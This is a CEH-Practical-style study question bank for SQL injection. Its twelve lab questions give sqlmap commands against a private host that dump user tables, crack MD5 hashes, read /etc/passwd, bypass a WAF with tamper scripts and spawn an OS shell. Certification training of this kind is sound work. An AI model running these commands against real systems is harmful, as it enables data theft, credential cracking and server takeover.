# Question Bank — SQL Injection (12 questions)

> Realistic CEH-Practical-style questions. Steps link into the [sqlmap tool doc](../../tools/sqlmap.md) — click any flag to read what it does.

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Detect SQLi on `http://10.10.10.5/product.php?id=1`

**Category:** Detection | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. `sqlmap -u 'http://10.10.10.5/product.php?id=1' --batch` ← [why --batch](../../tools/sqlmap.md#batch-mode)
2. Read the summary: `Parameter: id (GET)` + `Type: boolean-based blind / UNION / error-based`.

**Answer format:** the vulnerable parameter name + injection type

**Gotcha:** always quote the URL in single quotes — `&` in bash will background the process.

---

### Q2 🟢 — Identify the DBMS and version behind 10.10.10.5

**Category:** DBMS fingerprint | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. `sqlmap -u 'http://10.10.10.5/product.php?id=1' --batch -f --banner` ← [why --banner](../../tools/sqlmap.md#fingerprinting)
2. Read `back-end DBMS:` and `banner:` lines.

**Answer format:** DBMS + version (e.g. `MySQL 5.7.29`)

**Gotcha:** `-f` (`--fingerprint`) is more aggressive than `--banner`. If banner is null, try `--current-db` which will also re-fingerprint.

---

### Q3 🟢 — List all databases exposed on 10.10.10.5

**Category:** Enumeration | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. `sqlmap -u 'http://10.10.10.5/product.php?id=1' --batch --dbs` ← [why --dbs](../../tools/sqlmap.md#enumeration)
2. Count the list under `available databases [N]:`.

**Answer format:** integer or database names as asked

**Gotcha:** `information_schema`, `mysql`, `performance_schema`, `sys` are default — usually NOT the answer. Look for app-specific names.

---

### Q4 🟡 — Find the current database name on 10.10.10.5

**Category:** Enumeration | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. `sqlmap -u 'http://10.10.10.5/product.php?id=1' --batch --current-db`
2. `sqlmap -u '...' --batch --current-user` (bonus — often asked in same Q)

**Answer format:** the db name (e.g. `shopdb`)

---

### Q5 🟡 — List tables inside database `shopdb` on 10.10.10.5

**Category:** Enumeration | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. `sqlmap -u 'http://10.10.10.5/product.php?id=1' --batch -D shopdb --tables` ← [why -D](../../tools/sqlmap.md#enumeration)
2. Note the `users` / `admins` / `credentials` tables.

**Answer format:** the table name you need (typically `users`)

---

### Q6 🟡 — Dump the `users` table from `shopdb` on 10.10.10.5

**Category:** Data extraction | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. Columns first: `sqlmap -u '...' --batch -D shopdb -T users --columns`
2. Full dump: `sqlmap -u '...' --batch -D shopdb -T users --dump`
3. sqlmap offers to crack found hashes automatically — say yes.

**Answer format:** `admin:<password>` or the CSV path under `~/.local/share/sqlmap/output/10.10.10.5/dump/shopdb/users.csv`

**Gotcha:** if `--dump` is slow (blind), add `--threads 10` and `--where "id<50"` to limit rows.

---

### Q7 🟡 — Crack an MD5 hash dumped from the users table

**Category:** Post-exploitation | **Tools:** [hashcat](../../tools/hashcat.md), [john](../../tools/john.md)

**Steps:**
1. Save hash to `hash.txt`.
2. `hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` ← [why -m 0](../../tools/hashcat.md#common-modes)
3. Or `john --format=raw-md5 --wordlist=rockyou.txt hash.txt`
4. See also [18-crypto](../../18-cryptography/README.md) for alternate hash types.

**Answer format:** cleartext password

**Gotcha:** if hash is `md5($salt.$pass)` use `-m 20`, if `md5($pass.$salt)` use `-m 10`. Mode matters.

---

### Q8 🟡 — Inject via a POST request saved from Burp (`req.txt`)

**Category:** Authenticated SQLi | **Tools:** [sqlmap](../../tools/sqlmap.md), [burp](../../tools/burpsuite.md)

**Steps:**
1. In [burp](../../tools/burpsuite.md), right-click the request → Copy to file → `req.txt`.
2. `sqlmap -r req.txt --batch --dbs` ← [why -r](../../tools/sqlmap.md#request-file)
3. If multiple params, specify: `sqlmap -r req.txt -p username --dbs`

**Answer format:** whatever the Q asks after you have injection

**Gotcha:** sqlmap auto-handles cookies, CSRF tokens (`--csrf-token` / `--csrf-url`), and session auth from the req file.

---

### Q9 🟡 — Extract data from an authenticated page requiring a session cookie

**Category:** Authenticated SQLi | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. Log in via browser, grab `PHPSESSID` from devtools.
2. `sqlmap -u 'http://10.10.10.5/dashboard.php?uid=1' --cookie='PHPSESSID=abc123' --batch --dump` ← [why --cookie](../../tools/sqlmap.md#authentication)

**Answer format:** dumped value

**Gotcha:** session may expire mid-dump — use `--keep-alive` and consider `--delay 1`.

---

### Q10 🔴 — Get an OS shell via `--os-shell` on 10.10.10.5

**Category:** RCE via SQLi | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. `sqlmap -u 'http://10.10.10.5/product.php?id=1' --batch --os-shell` ← [why --os-shell](../../tools/sqlmap.md#os-shell)
2. sqlmap will ask for the web writable path (typical: `/var/www/html`) and web root URL.
3. On the drop-in prompt: `id`, `whoami`, `cat /home/*/user.txt`

**Answer format:** flag contents

**Gotcha:** needs `FILE` privilege on MySQL + writable web root + known URL path. Falls back to UDF upload on MySQL.

---

### Q11 🔴 — Bypass a WAF blocking basic payloads on 10.10.10.5

**Category:** Evasion | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. Try tamper scripts: `sqlmap -u '...' --batch --tamper=space2comment,between,randomcase` ← [why --tamper](../../tools/sqlmap.md#tamper-scripts)
2. Lower aggression: `--level=5 --risk=3 --random-agent --delay=2`
3. Common WAF bypass tampers: `space2comment`, `between`, `charencode`, `equaltolike`, `apostrophenullencode`.
4. List all: `sqlmap --list-tampers`

**Answer format:** the injection type finally detected

**Gotcha:** chain tampers with commas. Never use conflicting ones (e.g. `space2comment` + `space2plus`).

---

### Q12 🔴 — Read `/etc/passwd` from the DB server via `--file-read`

**Category:** File disclosure | **Tools:** [sqlmap](../../tools/sqlmap.md)

**Steps:**
1. Confirm DBMS is MySQL/PostgreSQL/MSSQL (file read support varies).
2. `sqlmap -u 'http://10.10.10.5/product.php?id=1' --batch --file-read=/etc/passwd` ← [why --file-read](../../tools/sqlmap.md#file-access)
3. File is saved under `~/.local/share/sqlmap/output/.../files/`.
4. Bonus — time-based blind only? Add `--technique=T --time-sec=5`.

**Answer format:** username line from `/etc/passwd` or its hex content

**Gotcha:** MySQL needs `FILE` privilege + `secure_file_priv` not set. If it fails, fall back to `--os-shell` (Q10).

---

## 📌 Quick links

- [sqlmap full reference](../../tools/sqlmap.md)
- [burp (request capture)](../../tools/burpsuite.md)
- [hashcat](../../tools/hashcat.md) · [john](../../tools/john.md) (for cracking dumped hashes)
- [SQLi playbook (decision tree)](../../playbooks/sqli-playbook.md)
- [13-sqli README](../../13-sqli/README.md)
- [12-web-apps question bank](./12-web-apps.md) · [18-crypto README](../../18-cryptography/README.md)
